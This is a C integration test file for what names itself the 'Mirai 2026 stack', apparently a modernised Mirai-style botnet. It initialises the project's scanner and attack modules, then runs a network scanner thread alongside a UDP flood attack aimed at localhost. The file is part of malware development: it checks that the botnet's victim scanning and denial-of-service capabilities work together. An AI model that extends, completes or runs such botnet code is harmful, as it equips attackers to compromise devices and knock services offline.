/**
 * @file test_full_stack.c
 * @brief Integration tests for the full Mirai 2026 stack
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>

#include "../../src/scanner/scanner_modern.h"
#include "../../src/attack/attack_modern.h"
#include "../../src/common/logger.h"
#include "../../src/common/config_loader.h"

static void test_full_initialization(void) {
    printf("TEST: Full stack initialization... ");
    
    logger_init(LOG_LEVEL_INFO, NULL);
    
    // Initialize all modules
    int result = attack_modern_init();
    assert(result == 0);
    
    if (scanner_modern_init(NULL, 64) < 0) {
        printf("SKIP (requires privileges)\n");
        attack_modern_cleanup();
        logger_cleanup();
        return;
    }
    
    // Cleanup
    scanner_modern_cleanup();
    attack_modern_cleanup();
    logger_cleanup();
    
    printf("PASS\n");
}

static void test_scanner_and_attack_concurrent(void) {
    printf("TEST: Scanner and attack running concurrently... ");
    
    logger_init(LOG_LEVEL_INFO, NULL);
    attack_modern_init();
    
    if (scanner_modern_init(NULL, 32) < 0) {
        printf("SKIP (requires privileges)\n");
        attack_modern_cleanup();
        logger_cleanup();
        return;
    }
    
    // Start scanner thread
    pthread_t scanner_thread;
    pthread_create(&scanner_thread, NULL, scanner_modern_run, NULL);
    
    // Start an attack
    attack_target_t target = {0};
    target.addr.sin_family = AF_INET;
    target.addr.sin_port = htons(9999);
    inet_pton(AF_INET, "127.0.0.1", &target.addr.sin_addr);
    
    attack_handle_t *attack = attack_modern_start(
        ATTACK_VECTOR_UDP_FLOOD, &target, 1, NULL, 0, 3
    );
    
    // Let both run
    sleep(4);
    
    // Stop everything
    scanner_modern_stop();
    pthread_join(scanner_thread, NULL);
    
    if (attack) {
        attack_modern_stop(attack);
    }
    
    scanner_modern_cleanup();
    attack_modern_cleanup();
    logger_cleanup();
    
    printf("PASS\n");
}

int main(void) {
    printf("Running integration tests...\n");
    printf("========================================\n");
    
    test_full_initialization();
    test_scanner_and_attack_concurrent();
    
    printf("========================================\n");
    printf("All integration tests completed!\n");
    
    return 0;
}
